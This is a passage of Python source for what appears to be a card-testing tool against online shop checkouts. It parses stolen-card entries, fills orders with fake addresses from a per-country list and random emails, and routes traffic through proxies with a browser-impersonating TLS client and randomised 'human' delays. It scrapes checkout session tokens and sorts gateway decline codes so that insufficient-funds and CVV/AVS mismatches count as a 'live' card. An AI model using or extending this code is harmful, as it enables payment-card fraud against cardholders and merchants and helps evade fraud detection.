        Address("rafiq", "islam", "30 Dhanmondi", "Dhanmondi", "Dhaka", "BD", "DH", "1205", "+880212345679", "gmail.com"),
        Address("kamal", "uddin", "15 Zindabazar", "Sylhet", "Sylhet", "BD", "SY", "3100", "+880821123456", "yahoo.com"),
    ],
    "LK": [
        Address("kasun", "perera", "1 Galle Road", "Colombo 3", "Colombo", "LK", "WP", "00300", "+94112345678", "gmail.com"),
        Address("nuwan", "silva", "20 Kandy Road", "Kelaniya", "Colombo", "LK", "WP", "11600", "+94112345679", "outlook.com"),
        Address("chaminda", "fernando", "30 Main Street", "Kandy", "Kandy", "LK", "CP", "20000", "+94812345678", "gmail.com"),
        Address("dinesh", "jayasinghe", "15 Beach Road", "Galle", "Galle", "LK", "SP", "80000", "+94912345678", "yahoo.com"),
    ],
    "UA": [
        Address("oleksandr", "shevchenko", "1 Khreshchatyk", "Shevchenkivskyi", "Kyiv", "UA", "30", "01001", "+380441234567", "gmail.com"),
        Address("andriy", "kovalenko", "20 Deribasivska", "Prymorskyi", "Odesa", "UA", "51", "65026", "+380482123456", "outlook.com"),
        Address("volodymyr", "bondarenko", "30 Sumska", "Kyivskyi", "Kharkiv", "UA", "63", "61000", "+380572123456", "gmail.com"),
        Address("dmytro", "tkachenko", "15 Svobody Ave", "Halitskyi", "Lviv", "UA", "46", "79000", "+380322123456", "yahoo.com"),
    ],
    "RO": [
        Address("andrei", "popescu", "1 Calea Victoriei", "Sector 1", "Bucharest", "RO", "B", "010061", "+4031234567", "gmail.com"),
        Address("alexandru", "ionescu", "20 Strada Republicii", "Centru", "Cluj-Napoca", "RO", "CJ", "400015", "+403641234567", "outlook.com"),
        Address("mihai", "constantin", "30 Bulevardul Stefan cel Mare", "Centru", "Iasi", "RO", "IS", "700028", "+402321234567", "gmail.com"),
        Address("stefan", "stan", "15 Strada Alba Iulia", "Centru", "Timisoara", "RO", "TM", "300077", "+402561234567", "yahoo.com"),
    ],
    "HU": [
        Address("laszlo", "nagy", "1 Vaci utca", "Belvaros", "Budapest", "HU", "BU", "1052", "+3611234567", "gmail.com"),
        Address("istvan", "kovacs", "20 Kossuth Lajos utca", "Belvaros", "Debrecen", "HU", "HB", "4024", "+36521234567", "outlook.com"),
        Address("zoltan", "toth", "30 Foe utca", "Belvaros", "Szeged", "HU", "CS", "6720", "+36621234567", "gmail.com"),
        Address("gabor", "szabo", "15 Kiraly utca", "Belvaros", "Pecs", "HU", "BA", "7621", "+36721234567", "yahoo.com"),
    ],
    "BG": [
        Address("georgi", "ivanov", "1 Vitosha Boulevard", "Centar", "Sofia", "BG", "22", "1000", "+359212345678", "gmail.com"),
        Address("dimitar", "petrov", "20 Knyaz Aleksandar I", "Centar", "Plovdiv", "BG", "16", "4000", "+359321234567", "outlook.com"),
        Address("ivan", "dimitrov", "30 Knyaz Boris I", "Centar", "Varna", "BG", "03", "9000", "+359521234567", "gmail.com"),
        Address("petar", "stoyanov", "15 Aleksandrovska", "Centar", "Burgas", "BG", "02", "8000", "+359561234567", "yahoo.com"),
    ],
    "HR": [
        Address("ivan", "horvat", "1 Ilica", "Donji grad", "Zagreb", "HR", "21", "10000", "+38512345678", "gmail.com"),
        Address("marko", "kovac", "20 Marmontova", "Grad", "Split", "HR", "17", "21000", "+38521345678", "outlook.com"),
        Address("luka", "babic", "30 Stradun", "Stari grad", "Dubrovnik", "HR", "19", "20000", "+38520345678", "gmail.com"),
        Address("josip", "novak", "15 Korzo", "Centar", "Rijeka", "HR", "08", "51000", "+38551345678", "yahoo.com"),
    ],
    "SK": [
        Address("peter", "novak", "1 Obchodna", "Stare Mesto", "Bratislava", "SK", "BL", "811 06", "+421212345678", "gmail.com"),
        Address("martin", "horvath", "20 Hlavna", "Stare Mesto", "Kosice", "SK", "KI", "040 01", "+421551234567", "outlook.com"),
        Address("juraj", "varga", "30 Hlavna", "Centrum", "Presov", "SK", "PV", "080 01", "+421511234567", "gmail.com"),
        Address("milan", "toth", "15 Hlavna", "Centrum", "Zilina", "SK", "ZA", "010 01", "+421411234567", "yahoo.com"),
    ],
    "LT": [
        Address("tomas", "kazlauskas", "1 Gedimino prospektas", "Senamiestis", "Vilnius", "LT", "VL", "01103", "+37052123456", "gmail.com"),
        Address("mindaugas", "petrauskas", "20 Laisves aleja", "Centras", "Kaunas", "LT", "KU", "44240", "+37037123456", "outlook.com"),
        Address("andrius", "jankauskas", "30 Tiltu gatve", "Senamiestis", "Klaipeda", "LT", "KL", "91233", "+37046123456", "gmail.com"),
        Address("darius", "stankevicius", "15 Respublikos gatve", "Centras", "Siauliai", "LT", "SA", "76285", "+37041123456", "yahoo.com"),
    ],
    "LV": [
        Address("janis", "berzins", "1 Brivibas iela", "Centrs", "Riga", "LV", "RIX", "1050", "+37167123456", "gmail.com"),
        Address("andris", "kalnins", "20 Rigas iela", "Centrs", "Daugavpils", "LV", "DGV", "5401", "+37165412345", "outlook.com"),
        Address("martins", "ozols", "30 Liela iela", "Centrs", "Liepaja", "LV", "LPX", "3401", "+37163412345", "gmail.com"),
        Address("kristaps", "jansons", "15 Rigas iela", "Centrs", "Jelgava", "LV", "JEL", "3001", "+37163012345", "yahoo.com"),
    ],
    "EE": [
        Address("juhan", "tamm", "1 Viru tanav", "Kesklinn", "Tallinn", "EE", "HA", "10111", "+3726123456", "gmail.com"),
        Address("marko", "saar", "20 Riia tanav", "Kesklinn", "Tartu", "EE", "TA", "51004", "+3727123456", "outlook.com"),
        Address("kristjan", "sepp", "30 Rüütli tanav", "Kesklinn", "Parnu", "EE", "PA", "80010", "+3724423456", "gmail.com"),
        Address("andres", "kask", "15 Narva maantee", "Kesklinn", "Narva", "EE", "ID", "20103", "+3723523456", "yahoo.com"),
    ],
    "IS": [
        Address("jon", "jonsson", "1 Laugavegur", "Midborg", "Reykjavik", "IS", "1", "101", "+3545123456", "gmail.com"),
        Address("gunnar", "gunnarsson", "20 Hverfisgata", "Midborg", "Reykjavik", "IS", "1", "101", "+3545123457", "outlook.com"),
        Address("olafur", "olafsson", "30 Austurstræti", "Midborg", "Reykjavik", "IS", "1", "101", "+3545123458", "gmail.com"),
        Address("sigurdur", "sigurdsson", "15 Bankastræti", "Midborg", "Reykjavik", "IS", "1", "101", "+3545123459", "yahoo.com"),
    ],
    "MT": [
        Address("john", "camilleri", "1 Republic Street", "Valletta", "Valletta", "MT", "VLT", "VLT 1111", "+35621234567", "gmail.com"),
        Address("paul", "borg", "20 Tower Road", "Sliema", "Sliema", "MT", "SLM", "SLM 1234", "+35621345678", "outlook.com"),
        Address("joseph", "micallef", "30 Main Street", "Victoria", "Gozo", "MT", "GOZ", "VCT 1234", "+35621567890", "gmail.com"),
        Address("carmel", "zammit", "15 Marina Street", "Msida", "Msida", "MT", "MSD", "MSD 1234", "+35621456789", "yahoo.com"),
    ],
    "CY": [
        Address("andreas", "christou", "1 Ledra Street", "Nicosia", "Nicosia", "CY", "01", "1010", "+35722123456", "gmail.com"),
        Address("marios", "georgiou", "20 Makarios Avenue", "Nicosia", "Nicosia", "CY", "01", "1065", "+35722123457", "outlook.com"),
        Address("costas", "constantinou", "30 Anexartisias", "Limassol", "Limassol", "CY", "02", "3040", "+35725123456", "gmail.com"),
        Address("pavlos", "papadopoulos", "15 Poseidonos Avenue", "Paphos", "Paphos", "CY", "03", "8042", "+35726123456", "yahoo.com"),
    ],
}


CURRENCY_TO_COUNTRY: Dict[str, str] = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "EUR": "DE", "AUD": "AU",
    "NZD": "NZ", "JPY": "JP", "KRW": "KR", "HKD": "HK", "TWD": "TW",
    "SGD": "SG", "MYR": "MY", "THB": "TH", "PHP": "PH", "IDR": "ID",
    "VND": "VN", "INR": "IN", "PKR": "PK", "BDT": "BD", "LKR": "LK",
    "AED": "AE", "SAR": "SA", "EGP": "EG", "MAD": "MA", "NGN": "NG",
    "KES": "KE", "ZAR": "ZA", "BRL": "BR", "MXN": "MX", "ARS": "AR",
    "CLP": "CL", "COP": "CO", "PEN": "PE", "UAH": "UA", "RON": "RO",
    "HUF": "HU", "BGN": "BG", "CZK": "CZ", "PLN": "PL", "SEK": "SE",
    "NOK": "NO", "DKK": "DK", "CHF": "CH", "TRY": "TR", "ILS": "IL",
}


EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
    "protonmail.com", "icloud.com", "aol.com", "mail.com",
    "yandex.com", "proton.me",
]

FIRST_NAMES = [
    "james", "john", "robert", "michael", "william", "david", "richard",
    "joseph", "thomas", "charles", "mary", "patricia", "jennifer", "linda",
    "elizabeth", "barbara", "susan", "jessica", "sarah", "karen",
]

LAST_NAMES = [
    "smith", "johnson", "williams", "brown", "jones", "garcia", "miller",
    "davis", "rodriguez", "martinez", "anderson", "taylor", "thomas",
    "moore", "jackson", "martin", "lee", "white", "harris", "clark",
]

FALLBACK_POLL_ID = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"

CURRENCY_SYMBOLS: Dict[str, str] = {
    "USD": "$", "CAD": "CA$", "GBP": "£", "EUR": "€", "AUD": "A$",
    "NZD": "NZ$", "JPY": "¥", "KRW": "₩", "HKD": "HK$", "TWD": "NT$",
    "SGD": "S$", "MYR": "RM", "THB": "฿", "PHP": "₱", "IDR": "Rp",
    "VND": "₫", "INR": "₹", "PKR": "₨", "BDT": "৳", "LKR": "රු",
    "AED": "د.إ", "SAR": "﷼", "EGP": "E£", "MAD": "د.م.",
    "NGN": "₦", "KES": "KSh", "ZAR": "R", "BRL": "R$", "MXN": "MX$",
    "ARS": "AR$", "CLP": "CLP$", "COP": "COL$", "PEN": "S/",
    "UAH": "₴", "RON": "lei", "HUF": "Ft", "BGN": "лв",
    "CZK": "Kč", "PLN": "zł", "SEK": "kr", "NOK": "kr", "DKK": "kr",
    "CHF": "CHF", "TRY": "₺", "ILS": "₪",
}


def format_amount(amount: str, currency: str) -> str:
    """Return formatted price like £12.50 or ¥1500"""
    if not amount:
        return ""
    try:
        f = float(amount)
        sym = CURRENCY_SYMBOLS.get((currency or "USD").upper(), currency or "$")
        # JPY, KRW, VND — no decimals
        if (currency or "USD").upper() in ("JPY", "KRW", "VND", "IDR", "HUF", "CLP"):
            return f"{sym}{int(f):,}"
        return f"{sym}{f:.2f}"
    except (ValueError, TypeError):
        sym = CURRENCY_SYMBOLS.get((currency or "USD").upper(), "$")
        return f"{sym}{amount}"

PRODUCT_CACHE: Dict[str, Tuple[str, str, str, str, str, float]] = {}

APPROVED_CODES = {
    # 3DS / authentication — card live, extra step needed
    "3DS_REQUIRED", "3DS_AUTHENTICATION", "3DS_FAILED",
    "AUTHENTICATION_REQUIRED", "AUTHENTICATION_FAILED",
    "ACTION_REQUIRED", "ACTIONREQUIRED",
    "THREE_DS_REQUIRED", "THREE_DS_AUTHENTICATION",
    "UNABLE_TO_PROCESS_WITHOUT_3DS",
    "STRONG_CUSTOMER_AUTHENTICATION_REQUIRED",
    # funds / limits — card live, balance issue
    "INSUFFICIENT_FUNDS", "NOT_SUFFICIENT_FUNDS",
    "INSUFFICIENT_FUNDS_OR_LIMIT",
    "AMOUNT_TOO_LARGE", "EXCEEDS_APPROVAL_AMOUNT_LIMIT",
    "CARD_VELOCITY_EXCEEDED", "WITHDRAWAL_COUNT_LIMIT_EXCEEDED",
    "EXCEEDS_FREQUENCY_LIMIT", "TRANSACTION_FREQUENCY_LIMIT_EXCEEDED",
    "EXCEEDS_WORK_LIMIT", "DAILY_LIMIT_EXCEEDED", "WEEKLY_LIMIT_EXCEEDED",
    "CREDIT_LIMIT_REACHED",
    # CVV / AVS — card live, data mismatch
    "INCORRECT_CVC", "INVALID_CVC", "CVC_MISMATCH", "CVV_FAILURE",
    "CVV2_MISMATCH", "CVV_INCORRECT", "SECURITY_CODE_INCORRECT",
    "INCORRECT_ZIP", "POSTAL_CODE_MISMATCH", "AVS_FAILURE", "AVS_MISMATCH",
    "INCORRECT_ADDRESS", "ADDRESS_MISMATCH",
    # verification
    "VERIFICATION_REQUIRED", "VERIFICATION_FAILED",
    # issuer manual review — card live
    "CALL_ISSUER", "CALL_CARD_ISSUER", "REFER_TO_CARD_ISSUER",
    # account update — card live, new details available
    "NEW_ACCOUNT_INFORMATION_AVAILABLE", "ACCOUNT_INFORMATION_UPDATED",
    "CARD_REPLACED_OR_REISSUED",
    # numeric ISO codes → approved
    "51",   # insufficient funds
    "61",   # exceeds withdrawal limit
    "65",   # exceeds frequency limit
    "75",   # pin tries exceeded
    "76",   # invalid account
    "78",   # card not activated (live)
    "N7",   # CVV2 mismatch
}

RETRYABLE_CODES = {
    "INVENTORY_RESERVATION_FAILURE", "OUT_OF_STOCK", "PRODUCT_UNAVAILABLE",
    "SYSTEM_ERROR", "INTERNAL_ERROR", "GENERIC_ERROR_RETRY",
    "PROCESSING", "TIMEOUT", "SERVER_ERROR",
    "INVALID_ITEM_TOTAL", "ORDER_TOTAL_CHANGED", "PAYMENT_AMOUNT_MISMATCH",
    "ISSUER_NOT_AVAILABLE", "ISSUER_UNAVAILABLE",
    "TRY_AGAIN_LATER", "PLEASE_RETRY", "TRANSACTION_ERROR",
    "GATEWAY_ERROR", "GATEWAY_TIMEOUT", "ACQUIRER_ERROR",
    "HOST_ERROR", "NETWORK_ERROR", "CONNECTION_ERROR",
    "SWITCH_NOT_AVAILABLE", "DESTINATION_NOT_AVAILABLE",
    "96",  # system error (ISO)
    "91",  # issuer unavailable (ISO)
    "92",  # routing error (ISO)
}

DECLINE_CODES = {
    # generic decline
    "CARD_DECLINED", "GENERIC_DECLINE", "GENERIC_ERROR",
    "DO_NOT_HONOR", "DO_NOT_HONOUR", "DO_NOT_HONOR_GENERAL",
    # card status
    "PICKUP_CARD", "PICK_UP_CARD", "PICKUP_CARD_SPECIAL_CONDITIONS",
    "LOST_CARD", "STOLEN_CARD", "RESTRICTED_CARD", "CARD_BLOCKED",
    "CARD_NOT_ACTIVATED", "CARD_DEACTIVATED", "INACTIVE_CARD",
    "CLOSED_ACCOUNT", "CARD_CLOSED",
    "EXPIRED_CARD", "EXPIRED",
    # invalid data
    "INVALID_ACCOUNT", "INVALID_NUMBER", "INCORRECT_NUMBER",
    "INVALID_CARD", "INVALID_EXPIRY_DATE", "INVALID_EXPIRY",
    "NO_CARD_RECORD", "NO_SUCH_ISSUER",
    # transaction restrictions
    "TRANSACTION_NOT_ALLOWED", "TRANSACTION_NOT_PERMITTED",
    "SERVICE_NOT_ALLOWED", "SERVICE_NOT_PERMITTED",
    "STOP_PAYMENT_ORDER", "REVOCATION_OF_AUTHORIZATION",
    "REVOCATION_OF_ALL_AUTHORIZATIONS",
    "PAYMENT_METHOD_NOT_AVAILABLE", "PROCESSING_ERROR",
    "REFER_TO_CARDHOLDER", "CONTACT_CARD_ISSUER", "CALL_FOR_AUTHORIZATION",
    # fraud / risk
    "FRAUD", "SUSPECTED_FRAUD", "FRAUDULENT", "FRAUD_SUSPECTED",
    "FRAUD_BLOCKED", "FRAUD_DECLINE",
    "RISK_THRESHOLD", "HIGH_RISK", "BLOCKED_BY_RISK",
    "CARD_TESTING", "CARD_TESTING_SUSPECTED",
    # account issues
    "ACCOUNT_CLOSED", "ACCOUNT_BLOCKED", "ACCOUNT_FROZEN",
    "PAYER_ACCOUNT_LOCKED_OR_CLOSED",
    "ORDER_NOT_APPROVED", "PAYER_CANNOT_PAY", "PAYMENT_DENIED",
    "INVALID_TRANSACTION", "REATTEMPT_NOT_PERMITTED",
    "COMPLIANCE_VIOLATION", "RESTRICTED_OR_INACTIVE_ACCOUNT",
    "SECURITY_VIOLATION", "DECLINED_DUE_TO_UPDATED_ACCOUNT",
    "INVALID_OR_RESTRICTED_CARD", "CRYPTOGRAPHIC_FAILURE",
    "TRANSACTION_CANNOT_BE_COMPLETED",
    # limits exceeded → decline (not live card signal)
    "TRANSACTION_LIMIT_EXCEEDED", "TX_ATTEMPTS_EXCEED_LIMIT",
    "DECLINED_PLEASE_RETRY", "RETRY_DECLINED",
    # payment method
    "AMEX_DECLINED", "CURRENCY_NOT_SUPPORTED",
    "PAYMENT_METHOD_UNSUPPORTED",
    "MERCHANT_RULE", "CONFIRMATION_REJECTED",
    "CANCELLED_PAYMENT", "OFF_SESSION_REJECTED",
    # numeric ISO decline codes
    "01003", "05", "57", "62",
    "41",  # lost card
    "43",  # stolen card
    "54",  # expired card
    "55",  # incorrect PIN
    "59",  # suspected fraud
    "63",  # security violation
    "04",  # pick up card
}


def _clean_code(code: str) -> str:
    if not code:
        return ""
    c = code.strip().upper()
    c = c.replace(" ", "_").replace("-", "_")
    if "CAPTCHA" in c:
        return "CARD_DECLINED"
    return c


def _classify_code(code: str) -> Tuple[str, str]:
    c = _clean_code(code)
    if not c:
        return "error", "UNKNOWN"
    if c in APPROVED_CODES:
        return "approved", c
    if c in RETRYABLE_CODES:
        return "error", c
    if c in DECLINE_CODES:
        return "declined", c
    # keyword matching for codes not in sets
    if any(k in c for k in ("INSUFFICIENT", "NSF", "NO_FUNDS")):
        return "approved", "INSUFFICIENT_FUNDS"
    if any(k in c for k in ("3DS", "THREE_D", "AUTHENTICATION_REQUIRED",
                             "STRONG_CUSTOMER", "SCA_REQUIRED")):
        return "approved", "3DS_REQUIRED"
    if any(k in c for k in ("VELOCITY", "FREQUENCY", "DAILY_LIMIT",
                             "WEEKLY_LIMIT", "WITHDRAWAL_LIMIT", "EXCEEDS")):
        return "approved", "CARD_VELOCITY_EXCEEDED"
    if any(k in c for k in ("INVENTORY", "OUT_OF_STOCK", "UNAVAILABLE",
                             "STOCK")):
        return "error", "OUT_OF_STOCK"
    if any(k in c for k in ("ISSUER_NOT", "ISSUER_UNAVAIL", "TRY_AGAIN",
                             "PLEASE_RETRY", "GATEWAY_ERROR", "HOST_ERROR",
                             "NETWORK_ERROR", "SWITCH_NOT")):
        return "error", "ISSUER_NOT_AVAILABLE"
    if any(k in c for k in ("PICKUP", "PICK_UP")):
        return "declined", "PICKUP_CARD"
    if "STOLEN" in c:
        return "declined", "STOLEN_CARD"
    if "LOST" in c:
        return "declined", "LOST_CARD"
    if any(k in c for k in ("EXPIRED", "EXPIRY")):
        return "declined", "EXPIRED_CARD"
    if any(k in c for k in ("FRAUD", "FRAUDUL")):
        return "declined", "FRAUD"
    if any(k in c for k in ("RISK", "HIGH_RISK", "BLOCKED_BY")):
        return "declined", "RISK_THRESHOLD"
    if any(k in c for k in ("BLOCKED", "CARD_BLOCK")):
        return "declined", "CARD_BLOCKED"
    if any(k in c for k in ("DO_NOT_HONOR", "DO_NOT_HONOUR")):
        return "declined", "DO_NOT_HONOR"
    if any(k in c for k in ("CVV", "CVC", "SECURITY_CODE")):
        return "approved", "INCORRECT_CVC"
    if any(k in c for k in ("AVS", "POSTAL", "ZIP", "ADDRESS_MISMATCH")):
        return "approved", "AVS_FAILURE"
    if any(k in c for k in ("CALL_ISSUER", "CALL_CARD", "REFER_TO_CARD")):
        return "approved", "CALL_ISSUER"
    if any(k in c for k in ("NOT_PERMITTED", "NOT_ALLOWED", "REVOC",
                             "SERVICE_NOT", "STOP_PAYMENT")):
        return "declined", "TRANSACTION_NOT_PERMITTED"
    if any(k in c for k in ("DECLINE", "DECLINED", "DENIED", "REJECTED")):
        return "declined", "CARD_DECLINED"
    if any(k in c for k in ("ERROR", "FAIL", "TIMEOUT", "UNAVAIL")):
        return "error", c
    return "declined", c


def _extract_error_from_receipt(poll_body: str) -> ErrorInfo:
    info = ErrorInfo(raw=poll_body[:400])
    try:
        data = json.loads(poll_body)
        receipt = data.get("data", {}).get("receipt", {}) if isinstance(data, dict) else {}
        if not isinstance(receipt, dict):
            receipt = {}
        info.type = receipt.get("__typename", "") or receipt.get("type", "")
        errs = receipt.get("errors") or []
        if isinstance(errs, list) and errs:
            first = errs[0]
            if isinstance(first, dict):
                info.code = (first.get("code") or first.get("errorCode") or "").strip()
                info.message = (first.get("message") or first.get("nonLocalizedMessage") or first.get("localizedMessage") or first.get("reason") or "").strip()
                info.actionable = bool(first.get("actionable") or first.get("canRetry") or first.get("retryable"))
        single = receipt.get("error") or {}
        if not info.code and isinstance(single, dict):
            info.code = (single.get("code") or single.get("errorCode") or "").strip()
            if not info.message:
                info.message = (single.get("message") or single.get("nonLocalizedMessage") or single.get("localizedMessage") or "").strip()
        if not info.code:
            order = receipt.get("order") or {}
            oe = order.get("errors") or []
            if isinstance(oe, list) and oe and isinstance(oe[0], dict):
                info.code = (oe[0].get("code") or "").strip()
        if not info.code:
            for k in ("errorCode", "failureCode", "declineCode",
                      "declineReason", "statusCode", "paymentDeclineCode"):
                v = receipt.get(k)
                if v:
                    info.code = str(v).strip()
                    break
        # try nested payment/paymentMethod declineCode
        if not info.code:
            for nested_key in ("payment", "paymentMethod", "gatewayResponse"):
                nested = receipt.get(nested_key) or {}
                if isinstance(nested, dict):
                    for k in ("declineCode", "errorCode", "code"):
                        v = nested.get(k)
                        if v:
                            info.code = str(v).strip()
                            break
                if info.code:
                    break
    except Exception:
        pass
    if not info.code:
        for pat in (
            r'"code"\s*:\s*"([A-Z][A-Z0-9_]{1,60})"',
            r'"errorCode"\s*:\s*"([A-Z][A-Z0-9_]{1,60})"',
            r'"declineCode"\s*:\s*"([A-Z][A-Z0-9_]{1,60})"',
            r'"failureCode"\s*:\s*"([A-Z][A-Z0-9_]{1,60})"',
        ):
            m = re.search(pat, poll_body)
            if m:
                info.code = m.group(1)
                break
    if not info.message:
        for pat in (
            r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
            r'"localizedMessage"\s*:\s*"([^"]+)"',
            r'"message"\s*:\s*"([^"]+)"',
            r'"reason"\s*:\s*"([^"]+)"',
        ):
            m = re.search(pat, poll_body)
            if m:
                info.message = m.group(1)
                break
    if not info.type:
        m = re.search(r'"__typename"\s*:\s*"(\w+Receipt)"', poll_body)
        if m:
            info.type = m.group(1)
    kind, label = _classify_code(info.code) if info.code else ("error", "UNKNOWN")
    info.label = label
    info.severity = kind
    info.retryable = info.actionable or label in RETRYABLE_CODES or kind == "error"
    return info


def _extract_error_from_submit(submit_body: str) -> ErrorInfo:
    info = ErrorInfo(raw=submit_body[:400])
    try:
        data = json.loads(submit_body)
        node = data.get("data", {}).get("submitForCompletion", {})
        errors = node.get("errors") or []
        if isinstance(errors, list) and errors:
            first = errors[0]
            if isinstance(first, dict):
                info.code = (first.get("code") or "").strip()
                info.message = (first.get("message") or first.get("nonLocalizedMessage") or first.get("localizedMessage") or "").strip()
                info.actionable = bool(first.get("actionable") or first.get("retryable"))
    except Exception:
        pass
    if not info.code:
        # search for actual error code only — NOT messages
        for pat in (
            r'"code"\s*:\s*"([A-Z][A-Z0-9_]{1,60})"',
            r'"errorCode"\s*:\s*"([A-Z][A-Z0-9_]{1,60})"',
            r'"declineCode"\s*:\s*"([A-Z][A-Z0-9_]{1,60})"',
        ):
            m = re.search(pat, submit_body)
            if m:
                info.code = m.group(1)
                break
    if not info.message:
        for pat in (
            r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
            r'"localizedMessage"\s*:\s*"([^"]+)"',
            r'"message"\s*:\s*"([^"]+)"',
            r'"reason"\s*:\s*"([^"]+)"',
        ):
            m = re.search(pat, submit_body)
            if m:
                info.message = m.group(1)
                break
    kind, label = _classify_code(info.code) if info.code else ("error", "UNKNOWN")
    info.label = label
    info.severity = kind
    info.retryable = info.actionable or label in RETRYABLE_CODES or kind == "error"
    return info


def _to_float(v) -> Optional[float]:
    if v is None:
        return None
    s = str(v).strip().replace(",", ".")
    try:
        return float(s)
    except (ValueError, TypeError):
        return None


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"


def address_for_country(country: str) -> Address:
    if not country:
        country = "US"
    country = country.upper().strip()
    if country in ADDRESSES_BY_COUNTRY:
        return random.choice(ADDRESSES_BY_COUNTRY[country])
    base = country[:2]
    if base in ADDRESSES_BY_COUNTRY:
        return random.choice(ADDRESSES_BY_COUNTRY[base])
    return random.choice(ADDRESSES_BY_COUNTRY["US"])


def normalize_proxy(raw: str) -> str:
    p = (raw or "").strip()
    if not p:
        return ""
    if "://" not in p:
        parts = p.split(":")
        if len(parts) == 4:
            # host:port:user:pass
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 3 and "@" in parts[1]:
            # host:user@pass:port — unusual, fall through
            p = "http://" + p
        else:
            p = "http://" + p
    parsed = urllib.parse.urlparse(p)
    if not parsed.netloc:
        raise Exception(f"invalid proxy format: {raw}")
    return p


def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"invalid card format: {card_entry}")
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError:
        raise Exception(f"invalid card month/year: {card_entry}")
    return card_parts[0], card_month, card_year, card_parts[3]


async def _human_delay(min_ms: int = 150, max_ms: int = 600) -> None:
    await asyncio.sleep(random.randint(min_ms, max_ms) / 1000.0)


class AsyncTLSClient:
    def __init__(self, timeout=20, proxy_url=None, browser=None):
        self.timeout = timeout
        self.proxy_url = proxy_url
        self.browser = browser or DEFAULT_BROWSER
        b = BROWSER_MAP[self.browser]
        self.impersonate = self.browser
        self.user_agent = b["ua"]
        self.sec_ch_ua = b["sec_ch_ua"]
        self.sec_ch_ua_full = b["full_ver"]
        self._session = None

    def _make_session(self):
        s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
        s.headers.update({
            "User-Agent":               self.user_agent,
            "Accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language":          "en-US,en;q=0.9",
            "Accept-Encoding":          "gzip, deflate, br, zstd",
            "Connection":               "keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":           "document",
            "Sec-Fetch-Mode":           "navigate",
            "Sec-Fetch-Site":           "none",
            "Sec-Fetch-User":           "?1",
            "Cache-Control":            "max-age=0",
            "sec-ch-ua":                self.sec_ch_ua,
            "sec-ch-ua-mobile":         "?0",
            "sec-ch-ua-platform":       '"Windows"',
            "sec-ch-ua-full-version-list": self.sec_ch_ua_full,
            "sec-ch-ua-arch":           '"x86"',
            "sec-ch-ua-bitness":        '"64"',
            "sec-ch-ua-model":          '""',
            "sec-ch-ua-wow64":          "?0",
            "Priority":                 "u=0, i",
        })
        if self.proxy_url:
            s.proxies = {"http": self.proxy_url, "https": self.proxy_url}
        return s

    async def __aenter__(self):
        self._session = self._make_session()
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.get(url, **kwargs)

    async def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.post(url, data=data, json=json, **kwargs)

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None


def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return m.group(1) if m else ""


def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return m.group(1) if m else ""


def extract_source_token(checkout_html: str) -> str:
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(m.group(1)).strip('"') if m else ""


def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return m.group(1) if m else ""


def extract_identification_signature(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
    return m.group(1) if m else ""


def extract_currency_from_checkout(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    for pat in (
        r'"presentmentCurrency"\s*:\s*"([A-Z]{3})"',
        r'"currencyCode"\s*:\s*"([A-Z]{3})"',
        r'"currency"\s*:\s*"([A-Z]{3})"',
        r'<meta\s+property="og:price:currency"\s+content="([A-Z]{3})"',
    ):
        m = re.search(pat, unescaped)
        if m:
            return m.group(1)
    return ""


def extract_pci_session_id(pci_body: str) -> str:
    try:
        data = json.loads(pci_body)
        v = data.get("id")
        if isinstance(v, str) and v:
            return v
    except Exception:
        pass
    m = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return m.group(1) if m else ""


def extract_queue_token(proposal_json: str) -> str:
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return m.group(1) if m else ""


def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}))
        return bool(seller.get("isShippingRequired", True))
    except Exception:
        return True


def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyByHandle"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
